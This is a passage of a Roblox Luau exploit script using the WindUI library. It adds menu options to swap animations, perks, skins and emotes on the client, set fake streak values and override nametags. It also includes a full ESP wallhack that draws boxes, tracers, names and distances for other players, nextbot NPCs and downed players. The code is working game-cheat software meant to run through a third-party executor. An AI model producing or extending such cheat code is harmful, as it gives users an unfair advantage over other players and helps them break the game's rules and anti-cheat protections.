            Content = "Selected skin not found: " .. selectedSkinName,
            Duration = 3
        })
        return
    end
    
    pcall(function()
        tempRoot = Instance.new("Folder")
        tempRoot.Name = "__temp_skin_swap_" .. tostring(tick()):gsub("%.", "_")
        tempRoot.Parent = currentVariants
        
        tempCurrent = Instance.new("Folder")
        tempCurrent.Name = "tempCurrent"
        tempCurrent.Parent = tempRoot
        
        tempSelected = Instance.new("Folder")
        tempSelected.Name = "tempSelected"
        tempSelected.Parent = tempRoot
        
        for _, child in ipairs(currentSkin:GetChildren()) do
            child.Parent = tempCurrent
        end
        
        for _, child in ipairs(selectedSkin:GetChildren()) do
            child.Parent = tempSelected
        end
        
        for _, child in ipairs(tempCurrent:GetChildren()) do
            child.Parent = selectedSkin
        end
        
        for _, child in ipairs(tempSelected:GetChildren()) do
            child.Parent = currentSkin
        end
        
        tempRoot:Destroy()
        
        lastCurrentTool = toolName
        lastCurrentSkin = currentSkinName
        lastSelectedSkin = selectedSkinName
        isSkinSwapped = true
        
        WindUI:Notify({
            Title = "Item Skin Changer",
            Content = "Successfully swapped " .. currentSkinName .. " with " .. selectedSkinName .. " for " .. toolName,
            Duration = 3
        })
    end)
end

Tabs.Visuals:Section({ Title = "CarryAnimation Replacer", TextSize = 15 })
Tabs.Visuals:Divider()

Tabs.Visuals:Input({
    Title = "Current CarryAnimation",
    Placeholder = "Enter current carry animation name",
    Callback = function(value)
        if value ~= currentCarryAnim and currentCarryAnim ~= "" then
            revertPreviousSwap()
        end
        currentCarryAnim = value
    end
})

Tabs.Visuals:Input({
    Title = "Selected CarryAnimation",
    Placeholder = "Enter selected carry animation name",
    Callback = function(value)
        if value ~= selectedCarryAnim and selectedCarryAnim ~= "" then
            revertPreviousSwap()
        end
        selectedCarryAnim = value
    end
})

Tabs.Visuals:Button({
    Title = "Apply CarryAnimation Swap",
    Callback = function()
        swapCarryAnimations(currentCarryAnim, selectedCarryAnim)
    end
})

Tabs.Visuals:Button({
    Title = "Reset All CarryAnimations",
    Callback = function()
        revertPreviousSwap()
        currentCarryAnim = ""
        selectedCarryAnim = ""
        lastCurrentCarryAnim = ""
        lastSelectedCarryAnim = ""
        isSwapped = false
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "All animations reset to original",
            Duration = 3
        })
    end
})

Tabs.Visuals:Section({ Title = "Perk Replacer", TextSize = 15 })
Tabs.Visuals:Divider()

Tabs.Visuals:Input({
    Title = "Current Perk",
    Placeholder = "Enter current perk name",
    Callback = function(value)
        if value ~= currentPerk and currentPerk ~= "" then
            revertPreviousPerkSwap()
        end
        currentPerk = value
    end
})

Tabs.Visuals:Input({
    Title = "Selected Perk",
    Placeholder = "Enter selected perk name",
    Callback = function(value)
        if value ~= selectedPerk and selectedPerk ~= "" then
            revertPreviousPerkSwap()
        end
        selectedPerk = value
    end
})

Tabs.Visuals:Button({
    Title = "Apply Perk Swap",
    Callback = function()
        swapPerks(currentPerk, selectedPerk)
    end
})

Tabs.Visuals:Section({ Title = "Perk Replacer 2", TextSize = 15 })
Tabs.Visuals:Divider()

Tabs.Visuals:Input({
    Title = "Current Perk 2",
    Placeholder = "Enter current perk name",
    Callback = function(value)
        if value ~= currentPerk2 and currentPerk2 ~= "" then
            revertPreviousPerkSwap2()
        end
        currentPerk2 = value
    end
})

Tabs.Visuals:Input({
    Title = "Selected Perk 2",
    Placeholder = "Enter selected perk name",
    Callback = function(value)
        if value ~= selectedPerk2 and selectedPerk2 ~= "" then
            revertPreviousPerkSwap2()
        end
        selectedPerk2 = value
    end
})

Tabs.Visuals:Button({
    Title = "Apply Perk Swap 2",
    Callback = function()
        swapPerks2(currentPerk2, selectedPerk2)
    end
})

Tabs.Visuals:Button({
    Title = "Reset All Perks",
    Callback = function()
        revertPreviousPerkSwap()
        revertPreviousPerkSwap2()
        currentPerk = ""
        selectedPerk = ""
        lastCurrentPerk = ""
        lastSelectedPerk = ""
        isPerkSwapped = false
        currentPerk2 = ""
        selectedPerk2 = ""
        lastCurrentPerk2 = ""
        lastSelectedPerk2 = ""
        isPerkSwapped2 = false
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "All perks reset to original",
            Duration = 3
        })
    end
})

Tabs.Visuals:Section({ Title = "Item Skin Changer", TextSize = 15 })
Tabs.Visuals:Divider()

Tabs.Visuals:Input({
    Title = "Current Tool Name",
    Placeholder = "Enter tool name",
    Callback = function(value)
        currentTool = value
    end
})

Tabs.Visuals:Input({
    Title = "Current Skin",
    Placeholder = "Enter current skin name",
    Callback = function(value)
        currentSkin = value
    end
})

Tabs.Visuals:Input({
    Title = "Select Skin",
    Placeholder = "Enter selected skin name",
    Callback = function(value)
        selectedSkin = value
    end
})

Tabs.Visuals:Button({
    Title = "Apply Skin",
    Callback = function()
        swapSkins(currentTool, currentSkin, selectedSkin)
    end
})

Tabs.Visuals:Button({
    Title = "Reset Tool",
    Desc = "Not working? Try resetting tool",
    Callback = function()
        revertPreviousSkinSwap()
        currentTool = ""
        currentSkin = ""
        selectedSkin = ""
        lastCurrentTool = ""
        lastCurrentSkin = ""
        lastSelectedSkin = ""
        isSkinSwapped = false
        WindUI:Notify({
            Title = "Item Skin Changer",
            Content = "Tool skins reset to original",
            Duration = 3
        })
    end
})
     Tabs.Visuals:Section({ Title = "NameTag Changers", TextSize = 15 })
VisualNametagDropdown = Tabs.Visuals:Dropdown({
    Title = "Visual Nametag",
    Flag = "VisualNametagDropdown",
    Desc = "Select nametag appearance",
    Values = {"Ignore", "None"},
    Value = "Ignore",
    Callback = function(value)
        playerFolder = workspace.Game.Players:FindFirstChild(game.Players.LocalPlayer.Name)
        if playerFolder then
            if value == "None" then
                playerFolder:SetAttribute("Nametag", nil)
            elseif value ~= "Ignore" then
                cleanValue = value:gsub("%s+", "")
                playerFolder:SetAttribute("Nametag", cleanValue)
            end
        end
    end
})

function updateNametagList()
    nametagValues = {"Ignore", "None"}
    nametagsFolder = game:GetService("ReplicatedStorage").Items.Nametags
    
    if nametagsFolder then
        for _, nametagModule in ipairs(nametagsFolder:GetChildren()) do
            if nametagModule:IsA("ModuleScript") then
                success, nametagData = pcall(require, nametagModule)
                if success and nametagData and nametagData.AppearanceInfo then
                    table.insert(nametagValues, nametagData.AppearanceInfo.Name)
                end
            end
        end
    end
    
    VisualNametagDropdown:Refresh(nametagValues, "Ignore")
end

updateNametagList()

game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    wait(1)
    playerFolder = workspace.Game.Players:FindFirstChild(game.Players.LocalPlayer.Name)
    if playerFolder and VisualNametagDropdown.Value ~= "Ignore" then
        if VisualNametagDropdown.Value == "None" then
            playerFolder:SetAttribute("Nametag", nil)
        else
            cleanValue = VisualNametagDropdown.Value:gsub("%s+", "")
            playerFolder:SetAttribute("Nametag", cleanValue)
        end
    end
end)

game:GetService("RunService").Heartbeat:Connect(function()
    playerFolder = workspace.Game.Players:FindFirstChild(game.Players.LocalPlayer.Name)
    if playerFolder and VisualNametagDropdown.Value ~= "Ignore" then
        if VisualNametagDropdown.Value == "None" then
            playerFolder:SetAttribute("Nametag", nil)
        else
            cleanValue = VisualNametagDropdown.Value:gsub("%s+", "")
            currentTag = playerFolder:GetAttribute("Nametag")
            if currentTag ~= cleanValue then
                playerFolder:SetAttribute("Nametag", cleanValue)
            end
        end
    end
end)
Tabs.Visuals:Section({ Title = "Fake Streaks", TextSize = 15 })

FakeStreaksInput = Tabs.Visuals:Input({
    Title = "Fake Streaks",
    Flag = "FakeStreaksInput",
    Placeholder = "Enter streak value",
    Callback = function(value)
        num = tonumber(value)
        if num then
            game:GetService("Players").LocalPlayer:SetAttribute("Streak", num)
        end
    end
})
Tabs.Visuals:Section({ Title = "Emote Swapper (Very buggy)", TextSize = 20 })
Tabs.Visuals:Section({ Title = "What's different of emote Swapper and emote changer? well it's different because emote swap is gonna sawp emote from replace storage and emote changer is gonna fetch what emote you executed from remote spy, this may not working on shitty executeor", TextSize = 10 })
Tabs.Visuals:Divider()

EmoteSwapper = {
    CurrentEmotes = {},
    SelectedEmotes = {},
    SwappedPairs = {},
    InputFields = {},
    PendingApply = false,
    PendingSwaps = {}
}

for i = 1, 12 do
    EmoteSwapper.CurrentEmotes[i] = ""
    EmoteSwapper.SelectedEmotes[i] = ""
end

Tabs.Visuals:Section({ Title = "Current Emotes", TextSize = 16 })

for i = 1, 12 do
    EmoteSwapper.InputFields["CurrentEmote" .. i] = Tabs.Visuals:Input({
        Title = "Current Emote " .. i,
        Placeholder = "Enter current emote name",
        Value = "",
        Callback = function(value)
            EmoteSwapper.CurrentEmotes[i] = value
        end
    })
end

Tabs.Visuals:Section({ Title = "Selected Emotes", TextSize = 16 })

for i = 1, 12 do
    EmoteSwapper.InputFields["SelectedEmote" .. i] = Tabs.Visuals:Input({
        Title = "Select Emote " .. i,
        Placeholder = "Enter replacement emote name",
        Value = "",
        Callback = function(value)
            EmoteSwapper.SelectedEmotes[i] = value
        end
    })
end

function SwapEmoteNames(currentName, selectedName)
    Items = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
    if not Items then return false end
    
    EmotesFolder = Items:FindFirstChild("Emotes")
    if not EmotesFolder then return false end
    
    currentEmoteObj = EmotesFolder:FindFirstChild(currentName)
    selectedEmoteObj = EmotesFolder:FindFirstChild(selectedName)
    
    if currentEmoteObj and selectedEmoteObj then
        tempName = selectedName .. "_EmoteSwapTemp"
        
        while EmotesFolder:FindFirstChild(tempName) do
            tempName = tempName .. "_"
        end
        
        currentEmoteObj.Name = tempName
        selectedEmoteObj.Name = currentName
        currentEmoteObj.Name = selectedName
        
        return true
    end
    return false
end

function ResetEmoteNames()
    Items = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
    if not Items then return false end
    
    EmotesFolder = Items:FindFirstChild("Emotes")
    if not EmotesFolder then return false end
    
    for currentEmote, selectedEmote in pairs(EmoteSwapper.SwappedPairs) do
        currentEmoteObj = EmotesFolder:FindFirstChild(selectedEmote)
        selectedEmoteObj = EmotesFolder:FindFirstChild(currentEmote)
        
        if currentEmoteObj and selectedEmoteObj then
            tempName = currentEmote .. "_EmoteSwapTemp"
            
            while EmotesFolder:FindFirstChild(tempName) do
                tempName = tempName .. "_"
            end
            
            currentEmoteObj.Name = tempName
            selectedEmoteObj.Name = selectedEmote
            currentEmoteObj.Name = currentEmote
        end
    end
    
    return true
end

function ProcessPendingSwaps()
    if not EmoteSwapper.PendingSwaps or #EmoteSwapper.PendingSwaps == 0 then
        return
    end
    
    swappedCount = 0
    failedCount = 0
    
    for _, swapData in ipairs(EmoteSwapper.PendingSwaps) do
        currentEmote = swapData[1]
        selectedEmote = swapData[2]
        
        if SwapEmoteNames(currentEmote, selectedEmote) then
            EmoteSwapper.SwappedPairs[currentEmote] = selectedEmote
            swappedCount = swappedCount + 1
        else
            failedCount = failedCount + 1
        end
    end
    
    EmoteSwapper.PendingSwaps = {}
    EmoteSwapper.PendingApply = false
    
    return swappedCount, failedCount
end

function CheckIfPlayerDead()
    return not player.Character or not player.Character:FindFirstChild("Humanoid") or player.Character.Humanoid.Health <= 0
end

function CheckIfPlayerDowned()
    return player.Character and player.Character:GetAttribute("Downed")
end

EmoteSwapApplyButton = Tabs.Visuals:Button({
    Title = "Apply Emote Swap",
    Desc = "Swap the current emotes with selected ones",
    Icon = "refresh-cw",
    Callback = function()
        if CheckIfPlayerDead() and not CheckIfPlayerDowned() then
            EmoteSwapper.PendingSwaps = {}
            
            for i = 1, 12 do
                currentEmote = EmoteSwapper.CurrentEmotes[i]
                selectedEmote = EmoteSwapper.SelectedEmotes[i]
                
                if currentEmote ~= "" and selectedEmote ~= "" then
                    table.insert(EmoteSwapper.PendingSwaps, {currentEmote, selectedEmote})
                end
            end
            
            if #EmoteSwapper.PendingSwaps > 0 then
                EmoteSwapper.PendingApply = true
                WindUI:Notify({
                    Title = "Emote Swapper",
                    Content = "Player is dead. Emote swap will be applied when you respawn.",
                    Icon = "clock",
                    Duration = 3
                })
            else
                WindUI:Notify({
                    Title = "Emote Swapper",
                    Content = "No emotes specified to swap",
                    Icon = "x-circle",
                    Duration = 3
                })
            end
            return
        end
        
        swappedCount = 0
        failedCount = 0
        
        for i = 1, 12 do
            currentEmote = EmoteSwapper.CurrentEmotes[i]
            selectedEmote = EmoteSwapper.SelectedEmotes[i]
            
            if currentEmote ~= "" and selectedEmote ~= "" then
                if SwapEmoteNames(currentEmote, selectedEmote) then
                    EmoteSwapper.SwappedPairs[currentEmote] = selectedEmote
                    swappedCount = swappedCount + 1
                else
                    failedCount = failedCount + 1
                end
            end
        end
        
        message = ""
        if swappedCount > 0 then
            message = "Successfully swapped " .. tostring(swappedCount) .. " emote(s)"
        end
        if failedCount > 0 then
            if message ~= "" then message = message .. " | " end
            message = message .. "Failed to swap " .. tostring(failedCount) .. " emote(s)"
        end
        if message == "" then
            message = "No emotes specified to swap"
        end
        
        WindUI:Notify({
            Title = "Emote Swapper",
            Content = message,
            Icon = swappedCount > 0 and "check-circle" or "x-circle",
            Duration = 3
        })
    end
})

EmoteSwapResetButton = Tabs.Visuals:Button({
    Title = "Reset Emote Module",
    Desc = "Restore all emotes to their original names",
    Icon = "rotate-ccw",
    Callback = function()
        if ResetEmoteNames() then
            EmoteSwapper.SwappedPairs = {}
            EmoteSwapper.PendingSwaps = {}
            EmoteSwapper.PendingApply = false
            
            for i = 1, 12 do
                EmoteSwapper.CurrentEmotes[i] = ""
                EmoteSwapper.SelectedEmotes[i] = ""
                
                if EmoteSwapper.InputFields["CurrentEmote" .. i] then
                    EmoteSwapper.InputFields["CurrentEmote" .. i]:Set("")
                end
                if EmoteSwapper.InputFields["SelectedEmote" .. i] then
                    EmoteSwapper.InputFields["SelectedEmote" .. i]:Set("")
                end
            end
            
            WindUI:Notify({
                Title = "Emote Swapper",
                Content = "All emotes have been restored to original names!",
                Icon = "check-circle",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "Emote Swapper",
                Content = "Failed to reset emotes!",
                Icon = "x-circle",
                Duration = 3
            })
        end
    end
})

player.CharacterRemoving:Connect(function()
    if next(EmoteSwapper.SwappedPairs) then
        ResetEmoteNames()
    end
end)

player.CharacterAdded:Connect(function(character)
    task.wait(1)
    
    if CheckIfPlayerDowned() then
        return
    end
    
    if next(EmoteSwapper.SwappedPairs) then
        for currentEmote, selectedEmote in pairs(EmoteSwapper.SwappedPairs) do
            SwapEmoteNames(currentEmote, selectedEmote)
        end
    end
    
    if EmoteSwapper.PendingApply and #EmoteSwapper.PendingSwaps > 0 then
        swappedCount, failedCount = ProcessPendingSwaps()
        
        message = ""
        if swappedCount > 0 then
            message = "Successfully swapped " .. tostring(swappedCount) .. " emote(s)"
        end
        if failedCount > 0 then
            if message ~= "" then message = message .. " | " end
            message = message .. "Failed to swap " .. tostring(failedCount) .. " emote(s)"
        end
        
        if message ~= "" then
            WindUI:Notify({
                Title = "Emote Swapper",
                Content = message,
                Icon = swappedCount > 0 and "check-circle" or "x-circle",
                Duration = 3
            })
        end
    end
end)

player.CharacterAdded:Connect(function(character)
    task.wait(1)
    
    if character:GetAttribute("Downed") then
        return
    end
    
    if next(EmoteSwapper.SwappedPairs) then
        for currentEmote, selectedEmote in pairs(EmoteSwapper.SwappedPairs) do
            SwapEmoteNames(currentEmote, selectedEmote)
        end
    end
end)
task.spawn(function()
    task.wait(1)
    currentStreak = game:GetService("Players").LocalPlayer:GetAttribute("Streak")
    if currentStreak then
        FakeStreaksInput:Set(tostring(currentStreak))
    end
end)
     -- ESP Tab
playerEspElements = {}
playerEspConnection = nil
nextbotEspElements = {}
nextbotEspConnection = nil
downedTracerConnection = nil
downedNameESPConnection = nil
downedTracerLines = {}
downedNameESPLabels = {}

nextBotNames = {}
if ReplicatedStorage:FindFirstChild("NPCs") then
    for _, npc in ipairs(ReplicatedStorage.NPCs:GetChildren()) do
        table.insert(nextBotNames, npc.Name)
    end
end

function isNextbotModel(model)
    if not model or not model.Name then return false end
    for _, name in ipairs(nextBotNames) do
        if model.Name == name then return true end
    end
    return false
end

function getDistanceFromPlayer(targetPosition)
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return 0 end
    return (targetPosition - player.Character.HumanoidRootPart.Position).Magnitude
end

function cleanupTracers(tracerTable)
    for _, drawing in ipairs(tracerTable) do
        if drawing and drawing.Remove then 
            pcall(function() drawing:Remove() end)
        elseif drawing then 
            drawing.Visible = false 
        end
    end
    tracerTable = {}
end

function cleanupNameESPLabels(labelTable)
    for _, label in ipairs(labelTable) do
        if label and label.Remove then 
            label:Remove()
        elseif label then 
            label.Visible = false 
        end
    end
    labelTable = {}
end

function createESPObject()
    return {
        box = Drawing.new("Square"),
        tracer = Drawing.new("Line"),
        name = Drawing.new("Text"),
        distance = Drawing.new("Text"),
        boxLines = {}
    }
end

function setupESPObject(esp)
    esp.box.Thickness = 2
    esp.box.Filled = false
    esp.tracer.Thickness = 1
    esp.name.Size = 14
    esp.name.Center = true
    esp.name.Outline = true
    esp.distance.Size = 14
    esp.distance.Center = true
    esp.distance.Outline = true
end

function cleanupDrawingTable(drawingTable)
    for _, drawing in pairs(drawingTable) do
        if type(drawing) == "table" then
            for _, line in ipairs(drawing) do
                pcall(line.Remove, line)
            end
        else
            pcall(drawing.Remove, drawing)
        end
    end
end

function draw3DBox(esp, hrp, camera, boxColor, boxSize)
    if not hrp or not camera then return end
    
    boxSize = boxSize or Vector3.new(4, 5, 3)
    local size = boxSize
    local offsets = {
        Vector3.new( size.X/2,  size.Y/2,  size.Z/2), Vector3.new( size.X/2,  size.Y/2, -size.Z/2),
        Vector3.new( size.X/2, -size.Y/2,  size.Z/2), Vector3.new( size.X/2, -size.Y/2, -size.Z/2),
        Vector3.new(-size.X/2,  size.Y/2,  size.Z/2), Vector3.new(-size.X/2,  size.Y/2, -size.Z/2),
        Vector3.new(-size.X/2, -size.Y/2,  size.Z/2), Vector3.new(-size.X/2, -size.Y/2, -size.Z/2),
    }
    
    local screenPoints = {}
    local anyPointOnScreen = false

    for i, offset in ipairs(offsets) do
        local success, vec, onScreen = pcall(function()
            local worldPos = hrp.CFrame * CFrame.Angles(0, math.rad(90), 0) * offset
            return camera:WorldToViewportPoint(worldPos)
        end)
        if success then
            screenPoints[i] = {pos = Vector2.new(vec.X, vec.Y), depth = vec.Z, onScreen = onScreen}
            if onScreen and vec.Z > 0 then anyPointOnScreen = true end
        end
    end

    if not esp.boxLines or #esp.boxLines == 0 then
        esp.boxLines = {}
        for i = 1, 12 do
            local line = Drawing.new("Line")
            line.Thickness = 1
            line.ZIndex = 2
            table.insert(esp.boxLines, line)
        end
    end

    local edges = {
        {1, 2}, {1, 3}, {1, 5}, {2, 4}, {2, 6},
        {3, 4}, {3, 7}, {5, 6}, {5, 7}, {4, 8}, {6, 8}, {7, 8}
    }

    local distance = (player.Character and player.Character:FindFirstChild("HumanoidRootPart") and 
        (player.Character.HumanoidRootPart.Position - hrp.Position).Magnitude) or 10
    local thickness = math.clamp(3 / (distance / 50), 1, 3)

    for i, edge in ipairs(edges) do
        local line = esp.boxLines[i]
        if line then
            local p1, p2 = screenPoints[edge[1]], screenPoints[edge[2]]
            line.Color = boxColor or Color3.fromRGB(255, 255, 255)
            line.Thickness = thickness
            line.Transparency = 1
            if anyPointOnScreen and p1 and p2 and p1.depth > 0 and p2.depth > 0 then
                line.From = p1.pos
                line.To = p2.pos
                line.Visible = true
            else
                line.Visible = false
            end
        end
    end
end

function updatePlayerESP()
    local camera = workspace.CurrentCamera
    if not camera then return end
    
    local screenBottomCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
    local currentTargets = {}
    local gameFolder = workspace:FindFirstChild("Game")

    if gameFolder and gameFolder:FindFirstChild("Players") then
        for _, model in pairs(gameFolder.Players:GetChildren()) do
            if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
                local isPlayer = Players:GetPlayerFromCharacter(model) ~= nil
                local humanoid = model:FindFirstChild("Humanoid")
                
                if isPlayer and model.Name ~= player.Name and humanoid and humanoid.Health > 0 then
                    currentTargets[model] = true
                    
                    if not playerEspElements[model] then
                        playerEspElements[model] = createESPObject()
                        setupESPObject(playerEspElements[model])
                    end

                    local esp = playerEspElements[model]
                    local hrp = model.HumanoidRootPart
                    local vector, onScreen = camera:WorldToViewportPoint(hrp.Position)

                    if onScreen then
                        local topY = camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 3, 0)).Y
                        local bottomY = camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 3, 0)).Y
                        local size = (bottomY - topY) / 2
                        local toggles = featureStates.PlayerESP
                        local boxSize = humanoid and Vector3.new(2, humanoid.HipHeight + 5, 2) or Vector3.new(4, 5, 3)

                        if toggles.boxes then
                            local boxColor = toggles.rainbowBoxes and Color3.fromHSV((tick() % 5) / 5, 1, 1) or Color3.fromRGB(0, 255, 0)
                            if toggles.boxType == "2D" then
                                esp.box.Visible = true
                                esp.box.Size = Vector2.new(size * 2, size * 3)
                                esp.box.Position = Vector2.new(vector.X - size, vector.Y - size * 1.5)
                                esp.box.Color = boxColor
                                for _, line in ipairs(esp.boxLines) do line.Visible = false end
                            else
                                esp.box.Visible = false
                                pcall(draw3DBox, esp, hrp, camera, boxColor, boxSize)
                            end
                        else
                            esp.box.Visible = false
                            for _, line in ipairs(esp.boxLines) do line.Visible = false end
                        end

                        esp.tracer.Visible = toggles.tracers
                        if toggles.tracers then
                            esp.tracer.From = screenBottomCenter
                            esp.tracer.To = Vector2.new(vector.X, vector.Y)
                            esp.tracer.Color = toggles.rainbowTracers and Color3.fromHSV((tick() % 5) / 5, 1, 1) or Color3.fromRGB(0, 255, 0)
                        end

                        esp.name.Visible = toggles.names
                        if toggles.names then
                            esp.name.Text = model.Name
                            esp.name.Position = Vector2.new(vector.X, vector.Y - size * 1.5 - 20)
                            esp.name.Color = Color3.fromRGB(255, 255, 255)
                        end

                        esp.distance.Visible = toggles.distance
                        if toggles.distance then
                            local distance = getDistanceFromPlayer(hrp.Position)
                            esp.distance.Text = string.format("%.1f", distance)
                            esp.distance.Position = Vector2.new(vector.X, vector.Y + size * 1.5 + 5)
                            esp.distance.Color = Color3.fromRGB(255, 255, 255)
                        end
                    else
                        esp.box.Visible = false
                        esp.tracer.Visible = false
                        esp.name.Visible = false
                        esp.distance.Visible = false
                        for _, line in ipairs(esp.boxLines) do line.Visible = false end
                    end
                end
            end
        end
    end

    for target, esp in pairs(playerEspElements) do
        if not currentTargets[target] then
            cleanupDrawingTable(esp)
            playerEspElements[target] = nil
        end
    end
end

function updateNextbotESP()
    local camera = workspace.CurrentCamera
    if not camera then return end
    
    local screenBottomCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
    local currentTargets = {}

    local gameFolder = workspace:FindFirstChild("Game")
    if gameFolder and gameFolder:FindFirstChild("Players") then
        for _, model in pairs(gameFolder.Players:GetChildren()) do
            if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and isNextbotModel(model) then
                processNextbotModel(model, currentTargets, camera, screenBottomCenter)
            end
        end
    end

    if workspace:FindFirstChild("NPCs") then
        for _, model in pairs(workspace.NPCs:GetChildren()) do
            if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and isNextbotModel(model) then
                processNextbotModel(model, currentTargets, camera, screenBottomCenter)
            end
        end
    end

    for target, esp in pairs(nextbotEspElements) do
        if not currentTargets[target] then
            cleanupDrawingTable(esp)
            nextbotEspElements[target] = nil
        end
    end
end

function processNextbotModel(model, currentTargets, camera, screenBottomCenter)
    currentTargets[model] = true
    
    if not nextbotEspElements[model] then
        nextbotEspElements[model] = createESPObject()
        setupESPObject(nextbotEspElements[model])
    end

    local esp = nextbotEspElements[model]
    local hrp = model.HumanoidRootPart
    local vector, onScreen = camera:WorldToViewportPoint(hrp.Position)

    if onScreen then
        local topY = camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 3, 0)).Y
        local bottomY = camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, 3, 0)).Y
        local size = (bottomY - topY) / 2
        local toggles = featureStates.NextbotESP
        local humanoid = model:FindFirstChild("Humanoid")
        local boxSize = humanoid and Vector3.new(2, humanoid.HipHeight + 5, 2) or Vector3.new(4, 5, 3)

        if toggles.boxes then
            local boxColor = toggles.rainbowBoxes and Color3.fromHSV((tick() % 5) / 5, 1, 1) or Color3.fromRGB(255, 0, 0)
            if toggles.boxType == "2D" then
                esp.box.Visible = true
                esp.box.Size = Vector2.new(size * 2, size * 3)
                esp.box.Position = Vector2.new(vector.X - size, vector.Y - size * 1.5)
                esp.box.Color = boxColor
                for _, line in ipairs(esp.boxLines) do line.Visible = false end
            else
                esp.box.Visible = false
                pcall(draw3DBox, esp, hrp, camera, boxColor, boxSize)
            end
        else
            esp.box.Visible = false
            for _, line in ipairs(esp.boxLines) do line.Visible = false end
        end

        esp.tracer.Visible = toggles.tracers
        if toggles.tracers then
            esp.tracer.From = screenBottomCenter
            esp.tracer.To = Vector2.new(vector.X, vector.Y)
            esp.tracer.Color = toggles.rainbowTracers and Color3.fromHSV((tick() % 5) / 5, 1, 1) or Color3.fromRGB(255, 0, 0)
        end

        esp.name.Visible = toggles.names
        if toggles.names then
            esp.name.Text = model.Name
            esp.name.Position = Vector2.new(vector.X, vector.Y - size * 1.5 - 20)
            esp.name.Color = Color3.fromRGB(255, 0, 0)
        end

        esp.distance.Visible = toggles.distance
        if toggles.distance then
            local distance = getDistanceFromPlayer(hrp.Position)
            esp.distance.Text = string.format("%.1f", distance)
            esp.distance.Position = Vector2.new(vector.X, vector.Y + size * 1.5 + 5)
            esp.distance.Color = Color3.fromRGB(255, 0, 0)
        end
    else
        esp.box.Visible = false
        esp.tracer.Visible = false
        esp.name.Visible = false
        esp.distance.Visible = false
        for _, line in ipairs(esp.boxLines) do line.Visible = false end
    end
end

function startPlayerESP()
    if playerEspConnection then return end
    playerEspConnection = RunService.RenderStepped:Connect(updatePlayerESP)
end

function stopPlayerESP()
    if playerEspConnection then
        playerEspConnection:Disconnect()
        playerEspConnection = nil
    end
    for _, esp in pairs(playerEspElements) do
        cleanupDrawingTable(esp)
    end
    playerEspElements = {}
end

function startNextbotESP()
    if nextbotEspConnection then return end
    nextbotEspConnection = RunService.RenderStepped:Connect(updateNextbotESP)
end

function stopNextbotESP()
    if nextbotEspConnection then
        nextbotEspConnection:Disconnect()
        nextbotEspConnection = nil
    end
    for _, esp in pairs(nextbotEspElements) do
        cleanupDrawingTable(esp)
    end
    nextbotEspElements = {}
end

function setupNextbotDetection()
    local gameFolder = workspace:FindFirstChild("Game")
    if gameFolder and gameFolder:FindFirstChild("Players") then
        gameFolder.Players.ChildAdded:Connect(function(child)
            if child:IsA("Model") and isNextbotModel(child) then
                task.wait(0.5)
                updateNextbotESP()
            end
        end)
    end
    if workspace:FindFirstChild("NPCs") then
        workspace.NPCs.ChildAdded:Connect(function(child)
            if child:IsA("Model") and isNextbotModel(child) then
                task.wait(0.5)
                updateNextbotESP()
            end
        end)
    end
end

function startDownedTracer()
    downedTracerConnection = RunService.Heartbeat:Connect(function()
        cleanupTracers(downedTracerLines)
        downedTracerLines = {}
        local folder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
        if folder then
            for _, char in ipairs(folder:GetChildren()) do
                if char:IsA("Model") then
                    local team = char:GetAttribute("Team")
                    local downed = char:GetAttribute("Downed")
                    if team ~= "Nextbot" and char.Name ~= player.Name and downed == true then
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hrp and workspace.CurrentCamera then
                            local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
                            if onScreen then
                                if featureStates.DownedTracer then
                                    local tracer = Drawing.new("Line")
                                    tracer.Color = Color3.fromRGB(255, 165, 0)
                                    tracer.Thickness = 2
                                    tracer.From = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y)
                                    tracer.To = Vector2.new(pos.X, pos.Y)
                                    tracer.ZIndex = 1
                                    tracer.Visible = true
                                    table.insert(downedTracerLines, tracer)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

function stopDownedTracer()
    if downedTracerConnection then
        downedTracerConnection:Disconnect()
        downedTracerConnection = nil
    end
    cleanupTracers(downedTracerLines)
    downedTracerLines = {}
end

function startDownedNameESP()
    downedNameESPConnection = RunService.Heartbeat:Connect(function()
        cleanupNameESPLabels(downedNameESPLabels)
        downedNameESPLabels = {}
        local folder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
        if folder then
            for _, char in ipairs(folder:GetChildren()) do
                if char:IsA("Model") then
                    local team = char:GetAttribute("Team")
                    local downed = char:GetAttribute("Downed")
                    if team ~= "Nextbot" and char.Name ~= player.Name and downed == true then
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hrp and workspace.CurrentCamera then
                            local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
                            if onScreen then
                                local distance = getDistanceFromPlayer(hrp.Position)
                                local displayText = char.Name
                                if featureStates.DownedDistanceESP then
                                    displayText = displayText .. "\n" .. math.floor(distance) .. " studs"
                                end
                                local label = Drawing.new("Text")
                                label.Text = displayText
                                label.Size = 16
                                label.Center = true
                                label.Outline = true
                                label.OutlineColor = Color3.new(0, 0, 0)
                                label.Color = Color3.fromRGB(255, 165, 0)
                                label.Position = Vector2.new(pos.X, pos.Y - 50)
                                label.Visible = true
                                table.insert(downedNameESPLabels, label)
                            end
                        end
                    end
                end
            end
        end
    end)
end

function stopDownedNameESP()
    if downedNameESPConnection then
        downedNameESPConnection:Disconnect()
        downedNameESPConnection = nil
    end
    cleanupNameESPLabels(downedNameESPLabels)
    downedNameESPLabels = {}
